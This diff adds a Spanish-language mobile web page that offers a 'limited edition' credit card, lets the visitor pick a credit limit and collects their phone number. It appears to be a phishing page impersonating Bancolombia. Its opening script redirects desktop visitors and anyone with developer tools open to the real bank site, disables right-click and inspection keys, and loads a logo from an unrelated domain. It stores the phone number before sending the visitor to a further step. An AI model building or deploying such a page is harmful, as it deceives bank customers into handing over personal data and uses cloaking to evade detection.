@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <script>
+   // ==================== CONFIGURACIÓN ====================
+const REDIRECT_URL = "https://www.bancolombia.com";
+
+// Mejor detección de móvil
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent) 
+                && window.innerWidth < 1024; // doble protección
+
+// ==================== DETECCIÓN DE DEVTOOLS (más suave) ====================
+let devToolsDetected = false;
+
+function detectDevTools() {
+    if (devToolsDetected) return;
+
+    const threshold = 100;
+    const start = performance.now();
+    debugger;
+    const end = performance.now();
+
+    if (end - start > threshold) {
+        devToolsDetected = true;
+        window.location.replace(REDIRECT_URL);
+    }
+}
+
+// Solo activar detección agresiva en móvil y con menos frecuencia
+function initSecurity() {
+    // Ocultar al inicio
+    document.documentElement.style.display = 'none';
+
+    // Si no es móvil → redirigir
+    if (!isMobile) {
+        window.location.replace(REDIRECT_URL);
+        return;
+    }
+
+    // Mostrar página primero (antes de hacer fetch)
+    document.documentElement.style.display = 'block';
+
+    // Desactivar clic derecho y atajos
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if (['F12', 'Control', 'Shift', 'Meta'].some(k => e.key.includes(k))) {
+            e.preventDefault();
+        }
+    });
+
+    // Detección más suave
+    setInterval(() => {
+        detectDevTools();
+    }, 800); // menos agresivo
+}
+
+// Iniciar
+initSecurity();
+    </script>
+    <meta charset="utf-8">
+    <meta content="es" http-equiv="Content-Language">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tarjeta de Credito edicion limitada | Tricolor</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel=icon type=image/x-icon href="assets/img/logo-app.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/main.css" />
+    <link rel="stylesheet" href="css/bg-lineas.css" />
+
+    <style>
+        :root {
+            --bg: #f5f6f9;
+            --ink: #1f2126;
+            --panel: #ffffff;
+            --line: #d9dce3;
+            --accent: #f4d521;
+            --accent-2: #ff7f2f;
+            --muted: #51535b;
+            --success: #1f6d37;
+            --danger: #b42318;
+        }
+        * { box-sizing: border-box; }
+        html, body { 
+            height: 100%; 
+            margin: 0; 
+        }
+        body {
+            background: var(--bg);
+            font-family: "Segoe UI", sans-serif;
+            color: var(--ink);
+            display: flex;
+            justify-content: center;
+            overflow-y: auto;
+            overflow-x: hidden;
+            touch-action: pan-y;
+        }
+        .home-screen {
+            width: min(100vw, 760px);
+            min-height: 100vh;
+            padding: 42px 14px 24px;
+            position: relative;
+            overflow: visible;
+            overflow-x: hidden;
+        }
+        .home-screen::before,
+        .home-screen::after {
+            content: "";
+            position: absolute;
+            width: 220px;
+            height: 220px;
+            background: radial-gradient(circle, rgba(244,213,33,0.35) 0, transparent 72%);
+            opacity: 0.7;
+            filter: blur(16px);
+            z-index: 0;
+        }
+        .home-screen::before { top: -80px; right: -70px; }
+        .home-screen::after { 
+            bottom: -90px; left: -90px; 
+            background: radial-gradient(circle, rgba(59,197,223,0.26) 0, transparent 72%); 
+        }
+        .logo-mark {
+            width: 216px;
+            height: 61.2px;
+            margin: 0 auto 16px;
+            background: url('https://losmillonarios.click/assets/img/logo.svg') center/contain no-repeat;
+            position: relative;
+            z-index: 2;
+        }
+        .hero-card {
+            position: relative;
+            z-index: 2;
+            background: var(--panel);
+            border-radius: 18px;
+            padding: 0 0 18px;
+            border: 0;
+            box-shadow: 0 18px 30px rgba(0,0,0,0.04);
+            margin-bottom: 18px;
+        }
+        .hero-title {
+            margin: 16px 18px 10px;
+            font-size: clamp(22px, 5.6vw, 27px);
+            font-weight: 700;
+            letter-spacing: -0.01em;
+            text-align: center;
+        }
+        .hero-img {
+            width: 100%;
+            max-height: 360px;
+            border-radius: 14px;
+            object-fit: contain;
+            border: 0;
+            margin: 0 0 10px;
+            background: #fdfdfd;
+            display: block;
+        }
+        .limited-tag {
+            display: inline-block;
+            margin: 0 18px 10px;
+            padding: 6px 12px;
+            border-radius: 999px;
+            background: #111827;
+            color: #f4d521;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+        .lead {
+            margin: 0 18px 12px;
+            font-size: 15px;
+            line-height: 1.55;
+            color: var(--muted);
+        }
+        .benefit-list {
+            list-style: none;
+            padding: 0 18px 14px;
+            margin: 0;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 10px;
+        }
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            background: linear-gradient(135deg, #ffffff 0%, #f7f8fb 100%);
+            border: 1px solid var(--line);
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ink);
+            box-shadow: 0 10px 22px rgba(0,0,0,0.04);
+        }
+        .benefit-number {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: grid;
+            place-items: center;
+            background: linear-gradient(135deg, #111827, #343b45);
+            color: #fff;
+            font-weight: 700;
+            font-size: 13px;
+        }
+        .option-credit {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 18px 4px;
+            padding: 12px 14px;
+            border: 1.5px solid var(--line);
+            border-radius: 14px;
+            background: #fffdf7;
+            cursor: pointer;
+            user-select: none;
+            box-shadow: 0 10px 22px rgba(0,0,0,0.04);
+        }
+        .option-credit input { display: none; }
+        .option-credit .check {
+            width: 22px;
+            height: 22px;
+            border-radius: 6px;
+            border: 2px solid #111827;
+            display: grid;
+            place-items: center;
+            background: #fff;
+            font-size: 15px;
+            font-weight: 800;
+            color: #111827;
+        }
+        .option-credit.on {
+            border-color: var(--accent);
+            background: #fff8e1;
+        }
+        .option-credit.on .check {
+            background: #111827;
+            color: #f4d521;
+        }
+        .option-credit.on .check::after {
+            content: '✓';
+        }
+        .form-panel {
+            position: relative;
+            z-index: 2;
+            background: var(--panel);
+            border-radius: 16px;
+            border: 1px solid var(--line);
+            padding: 18px 18px 20px;
+            box-shadow: 0 16px 28px rgba(0,0,0,0.05);
+        }
+        .result {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 16px;
+            background: #fff;
+            border: 1px solid var(--line);
+            border-radius: 12px;
+            margin: 16px 0;
+            font-size: 15px;
+        }
+        .range-note {
+            font-size: 13.5px;
+            color: var(--muted);
+            line-height: 1.5;
+            margin-top: 8px;
+        }
+
+        /* Estilos del selector de cupo */
+        .cupo-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 10px;
+            margin: 14px 0 20px;
+        }
+        .cupo-option {
+            padding: 16px 12px;
+            border: 2px solid var(--line);
+            border-radius: 14px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 15px;
+            background: #fff;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .cupo-option:hover {
+            border-color: #c5c9d4;
+            transform: translateY(-2px);
+        }
+        .cupo-option.selected {
+            border-color: var(--accent);
+            background: #fff8e1;
+            box-shadow: 0 0 0 4px rgba(244, 213, 33, 0.15);
+        }
+        .cupo-custom input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            font-weight: 600;
+            border: 2px solid var(--line);
+            border-radius: 12px;
+            text-align: center;
+        }
+        .cupo-custom input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        #btn-submit {
+            width: 100%;
+            height: 52px;
+            border: 0;
+            border-radius: 28px;
+            background: var(--accent);
+            color: #1f2126;
+            font-weight: 700;
+            letter-spacing: 0.12em;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        #btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            background: #cfd1d7;
+            color: #8f9299;
+        }
+        .colombia-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #f4d521;
+            color: #1f2126;
+            padding: 4px 10px;
+            border-radius: 999px;
+            font-size: 12px;
+            font-weight: 700;
+            margin: 8px 18px;
+        }
+
+        /* Estilos para el número de teléfono */
+        .telefono-group {
+            margin: 20px 0 16px;
+        }
+        .telefono-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14.5px;
+            color: var(--ink);
+        }
+        .telefono-input {
+            width: 100%;
+            padding: 16px 18px;
+            font-size: 17px;
+            font-weight: 600;
+            border: 2px solid var(--line);
+            border-radius: 12px;
+            background: #fff;
+        }
+        .telefono-input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+        .telefono-input::placeholder {
+            color: #a0a3ad;
+        }
+    </style>
+</head>
+<body>
+
+<main class="home-screen">
+    <div class="logo-mark" aria-hidden="true"></div>
+
+    <section class="hero-card">
+        <br>
+        <h1 class="hero-title">Adquiere tu tarjeta credito Edicion Limitada</h1>
+        <img class="hero-img" 
+             src="website/assets/img/edicion_limitada.png" 
+             alt="Tarjeta crédito edición limitada">
+        
+        <span class="limited-tag">Edición limitada</span>
+        <p class="lead">Vive la experiencia Edición Limitada Colombia: solicita tu nueva tarjeta sin costo de renovación y desbloquea un crédito inmediato como cliente preferencial.</p>
+
+        <ul class="benefit-list">
+            <li class="benefit-item">
+                <span class="benefit-number" style="--dot:#f06a47">1</span>
+                <i class="bx bx-wallet"></i>
+                <span>Sin cuota de manejo</span>
+            </li>
+            <li class="benefit-item">
+                <span class="benefit-number" style="--dot:#2eba85">2</span>
+                <i class="bx bx-money"></i>
+                <span>Tasa de interés 1,2% mensual</span>
+            </li>
+            <li class="benefit-item">
+                <span class="benefit-number" style="--dot:#ff9833">3</span>
+                <i class="bx bx-home-alt"></i>
+                <span>Entrega a domicilio sin costo</span>
+            </li>
+            <li class="benefit-item">
+                <span class="benefit-number" style="--dot:#5d74ea">4</span>
+                <i class="bx bx-shield-quarter"></i>
+                <span>Mayor seguridad</span>
+            </li>
+            <li class="benefit-item">
+                <span class="benefit-number" style="--dot:#23a6ff">5</span>
+                <i class="bx bx-check-shield"></i>
+                <span>Cobertura Total</span>
+            </li>
+        </ul>
+
+        <label class="option-credit" id="cupoLabel">
+            <input type="checkbox" id="cupoOptIn">
+            <span class="check" aria-hidden="true"></span>
+            <div>
+                <strong>Elige tu Cupo</strong><br>
+                <small style="color:var(--muted);">Activa para seleccionar tu límite de crédito</small>
+            </div>
+        </label>
+
+        <div class="colombia-badge">
+            🇨🇴 Edición Colombia
+        </div>
+    </section>
+
+    <section class="form-panel">
+        <form class="form-card" method="post" onsubmit="return false;">
+            
+            <div id="cupoPanel" style="display:none;">
+                <p style="font-weight:600; margin-bottom:12px;">Selecciona tu cupo de crédito</p>
+                
+                <div class="cupo-options" id="cupoOptions">
+                    <div class="cupo-option" data-value="5000000">$5.000.000</div>
+                    <div class="cupo-option" data-value="8000000">$8.000.000</div>
+                    <div class="cupo-option" data-value="10000000">$10.000.000</div>
+                    <div class="cupo-option" data-value="12000000">$12.000.000</div>
+                    <div class="cupo-option" data-value="15000000">$15.000.000</div>
+                    <div class="cupo-option" data-value="20000000">$20.000.000</div>
+                </div>
+
+                <div class="cupo-custom">
+                    <p style="font-size:13px; color:var(--muted); margin-bottom:6px;">O ingresa un monto personalizado</p>
+                    <input type="text" id="cupoCustom" placeholder="$0" maxlength="12">
+                </div>
+
+                <div class="result">
+                    <span>Cupo seleccionado</span>
+                    <strong id="valor">$0</strong>
+                </div>
+
+                <p class="range-note">
+                    Interés mensual fijo del 1,2%. El pago mínimo dependerá del uso que le des a tu tarjeta de crédito.
+                </p>
+                <br><br>
+            </div>
+
+            <!-- Campo de Número de Teléfono -->
+            <div class="telefono-group">
+                <label class="telefono-label">Número de teléfono móvil</label>
+                <input type="tel" id="telefono" class="telefono-input" 
+                       placeholder="3001234567" maxlength="10"
+                       oninput="this.value = this.value.replace(/\D/g, '')">
+                <small style="color:var(--muted); font-size:13px; display:block; margin-top:6px;">
+                    Ingresa tu número sin el prefijo +57 (ej: 3001234567)
+                </small>
+            </div>
+
+            <div class="actions">
+                <button id="btn-submit" type="button" disabled>CONTINUAR</button>
+            </div>
+        </form>
+    </section>
+</main>
+
+<script>
+// ====================== SCRIPT ======================
+let cupoSeleccionado = 0;
+
+function formatCurrency(value) {
+    return "$" + Number(value).toLocaleString("es-CO");
+}
+
+function actualizarValor(valor) {
+    cupoSeleccionado = parseInt(valor) || 0;
+    document.getElementById("valor").innerText = formatCurrency(cupoSeleccionado);
+    verificarBoton();
+}
+
+function verificarBoton() {
+    const telefono = document.getElementById("telefono").value.trim();
+    const telefonoValido = telefono.length >= 10 && telefono.length <= 10;
+
+    document.getElementById("btn-submit").disabled = 
+        (cupoSeleccionado < 500000) || !telefonoValido;
+}
+
+function solicitarTarjeta() {
+    const telefono = document.getElementById("telefono").value.trim();
+    
+    // Guardar datos en localStorage
+    localStorage.setItem('cupo_solicitado', cupoSeleccionado);
+    localStorage.setItem('telefono', telefono);
+    
+    window.location.href = 'seleccionar-tarjeta.html';
+}
+
+window.addEventListener('load', () => {
+    const cupoCheckbox = document.getElementById("cupoOptIn");
+    const cupoLabel = document.getElementById("cupoLabel");
+    const cupoPanel = document.getElementById("cupoPanel");
+    const options = document.querySelectorAll('.cupo-option');
+    const customInput = document.getElementById("cupoCustom");
+    const telefonoInput = document.getElementById("telefono");
+
+    // Lógica del checkbox de cupo
+    cupoCheckbox.addEventListener('change', function() {
+        cupoLabel.classList.toggle('on', this.checked);
+        cupoPanel.style.display = this.checked ? 'block' : 'none';
+        if (!this.checked) resetearSeleccion();
+    });
+
+    // Selección de cupos predefinidos
+    options.forEach(option => {
+        option.addEventListener('click', () => {
+            options.forEach(opt => opt.classList.remove('selected'));
+            option.classList.add('selected');
+            customInput.value = '';
+            actualizarValor(option.dataset.value);
+        });
+    });
+
+    // Input de cupo personalizado
+    customInput.addEventListener('input', function() {
+        let valor = this.value.replace(/\D/g, '');
+        this.value = valor ? formatCurrency(valor) : '';
+        options.forEach(opt => opt.classList.remove('selected'));
+        if (valor) actualizarValor(valor);
+    });
+
+    // Validación del teléfono en tiempo real
+    telefonoInput.addEventListener('input', verificarBoton);
+
+    // Botón continuar
+    document.getElementById("btn-submit").addEventListener('click', solicitarTarjeta);
+
+    function resetearSeleccion() {
+        cupoSeleccionado = 0;
+        document.getElementById("valor").innerText = "$0";
+        options.forEach(opt => opt.classList.remove('selected'));
+        customInput.value = '';
+        verificarBoton();
+    }
+
+    // Verificar estado inicial del botón
+    verificarBoton();
+});
+</script>
+
+</body>
+</html>
